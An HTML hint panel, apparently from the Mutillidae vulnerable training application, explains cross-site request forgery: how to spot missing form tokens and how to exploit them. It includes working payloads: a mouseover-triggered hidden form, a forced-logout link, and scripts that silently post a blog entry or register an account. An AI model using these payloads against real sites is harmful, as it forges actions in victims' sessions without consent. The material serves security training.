<table class="hint-table">
	<tr class="hint-header" 
		id="idCSRFHintHeader"
		title="Click to open this section"
		onclick="toggleBody(this, window.document.getElementById('idCSRFHintBody'), window.document.getElementById('idCSRFHintHeaderImage'));"
		onmouseover="this.style.backgroundColor='#cccccc';this.style.color='#ffffff';"
		onmouseout="this.style.backgroundColor='#FFFFFF';this.style.color='#000000';"
	>
		<td><img id="idCSRFHintHeaderImage" align="left" style="padding-right: 5px;" alt="Expand Cross Site Request Forgery Hints" src="./images/down_arrow_16_16.png" />
			Cross Site Request Forgery Hints
		</td>
	</tr>
	<tr id="idCSRFHintBody" style="display: none;">
		<td class="hint-body">
			<br/><br/>
			<span class="report-header">Overview</span>
			<br/><br/>
			Cross site request forgery may occcur when an attacker is able to run script
			into a users browser. To forge a legitimate request, the script creates and
			send the same parameters to the target website that would be sent if the user
			had submitted the legitimate form themselves. The target website knows the 
			request has come from the users browser but cannot detect that the request was
			created and sent by a malicious script running in the users browser. As far as
			the target site can tell, the user submitted the request by using the web site
			in the expected way.
			<br/><br/>
			<span class="report-header">Discovery Methodology</span>
			<br/><br/>
			Check the target website forms for enbedded tokens which when sent along with the 
			other parameters on the form make each request unique. The token could be a random
			string, some form of CAPTCHA, random math problem, or other way to "sign" each 
			form in order to be able to identify the form later. If
			these tokens exists, they provide a method by which the target website can
			detect a forged request (which would not contain the token issued by the target
			web site). If the tokens are missing, the request is likely vulnerable to 
			cross site request forgery.
			<br/><br/>
			<span class="report-header">Exploitation</span>
			<br/><br/>
			Submit the legitimate form and carefully note each parameter and value that 
			must be sent for the server to process the request successfully. Either 
			generate HTML or create a JavaScript that will send the same parameters
			to the same target site when the user triggers the "sending event". Next
			create a "sending event" which will cause the users browser to run the HTML
			or JavaScript that will send the request. The "sending event" can be as simple
			as a hidden form that is submitted when the user visits a page (onload), hovers
			over a particular object (onmouseover), or click on a certain area (onclick).
			The method used is not important as long as the parameters needed by the target
			site are submitted. 
			<br/><br/>
			Note: If the target site requires authentication, the 
			submission will only be successful if the user is still logged into the target
			site. There is no need they actually being viewing the site. They just need
			have a valid session token. The browser will send the session token
			automatically.
			<br/><br/>
			<span class="report-header">Example</span>
			<br/><br/>
			Force someone to add a blog without consent:
<code>
&lt;form id=&quot;f&quot; action=&quot;index.php?page=add-to-your-blog.php&quot; method=&quot;post&quot; enctype=&quot;application/x-www-form-urlencoded&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;csrf-token&quot; value=&quot;best-guess&quot;/&gt;
&lt;input type=&quot;hidden&quot; name=&quot;blog_entry&quot; value=&quot;Add this guy to the Wall of Sheep&quot;/&gt;
&lt;input type=&quot;hidden&quot; name=&quot;add-to-your-blog-php-submit-button&quot; value=&quot;TESTING&quot;/&gt;
&lt;/form&gt;
&lt;i onmouseover=&quot;window.document.getElementById(\&#39;f\&#39;).submit()&quot;&gt;Dancing with the stars results&lt;/i&gt;
</code>
			<br/><br/>
			Force someone to log out:
<code>
&lt;i onmouseover=&quot;window.document.location=\&#39;http://localhost/mutillidae/index.php?do=logout\&#39;&quot;&gt;How to improve your Facebook status&lt;/i&gt;
</code>
			<br/><br/>
			Force someone to add a blog without consent using HTML injection:
			<br/>
<code>
&lt;script&gt;
	var f = document.createElement(&quot;form&quot;);
	f.method = &quot;POST&quot;;
	f.action = &quot;./index.php?page=add-to-your-blog.php&quot;;
	document.body.appendChild(f);
	
	var e = document.createElement(&quot;input&quot;);
	e.setAttribute(&quot;type&quot;, &quot;hidden&quot;);
	e.setAttribute(&quot;name&quot;, &quot;csrf-token&quot;);
	e.setAttribute(&quot;value&quot;, &quot;SecurityIsDisabled&quot;);
	f.appendChild(e);
	
	var e = document.createElement(&quot;input&quot;);
	e.setAttribute(&quot;type&quot;, &quot;hidden&quot;);
	e.setAttribute(&quot;name&quot;, &quot;blog_entry&quot;);
	e.setAttribute(&quot;value&quot;, &quot;this is an auto message!&quot;);
	f.appendChild(e); 

	var e = document.createElement(&quot;input&quot;);
	e.setAttribute(&quot;type&quot;, &quot;hidden&quot;);
	e.setAttribute(&quot;name&quot;, &quot;add-to-your-blog-php-submit-button&quot;);
	e.setAttribute(&quot;value&quot;, &quot;Save Blog Entry&quot;);
	f.appendChild(e);

	f.submit();
&lt;/script&gt;
</code>
			<br/>
			Force someone to register without their consent using a silent AJAX request:
<code>
&lt;script&gt;
	var lXMLHTTP; 
	try{
		var lUsername = &quot;&lt;USERNAME GOES HERE&gt;&quot;;
		var lPassword = &quot;&lt;PASSWORD GOES HERE&gt;&quot;;
		var lSignature = &quot;&lt;SIGNATURE GOES HERE&gt;&quot;;
		var lData = &quot;username=&quot;+lUsername+&quot;&amp;password=&quot;+lPassword+&quot;&amp;confirm_password=&quot;+lPassword+&quot;&amp;my_signature=&quot;+lSignature+&quot;&amp;register-php-submit-button=Create+Account&quot;;
		var lAction = &quot;./index.php?page=register.php&quot;;
		var lMethod = &quot;POST&quot;;

		try {
			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
		}catch(e){ 
			try {
				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
			}catch(e){
				try{
					lXMLHTTP = new XMLHttpRequest();
				}catch(e){
					alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
				}
			}
		}//end try

		lXMLHTTP.onreadystatechange = function(){
			if(lXMLHTTP.readyState == 4){
				alert(&quot;CSRF Complete&quot;);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
			}
		};
		
		lXMLHTTP.open(lMethod, lAction, true);
		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
		lXMLHTTP.send(lData);
	}catch(e){
		alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
	}
&lt;/script&gt; 
</code>
		</td>
	</tr>
</table>